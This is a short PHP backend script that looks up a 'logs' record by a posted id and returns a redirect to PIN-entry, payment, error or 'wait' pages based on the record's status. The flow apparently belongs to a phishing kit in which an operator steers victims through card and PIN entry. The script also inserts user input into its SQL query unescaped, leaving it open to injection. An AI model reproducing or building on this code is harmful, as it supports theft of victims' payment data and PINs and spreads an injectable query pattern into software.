<?php 
require "./config.php";

$id_log = $_POST['id_log'];

$result = $mysql->query("SELECT * FROM `logs` WHERE `id` = $id_log")->fetch_assoc();

if($result){
    if($result['status']=="pin_code"){
        echo "secure.php?id=".$id_log;
    }
    else if($result['status']=="payment"){
        echo "payment.php?id=".$id_log;
    }
    else if($result['status']=="error_payment"){
        echo "payment.php?errors=1&id=".$id_log;
    }
    else if($result['status'] == "error_pin_code"){
        echo "secure.php?errors=1&id=".$id_log;
    }
    else if($result['status'] == "wait"){
        echo "wait";
    }
}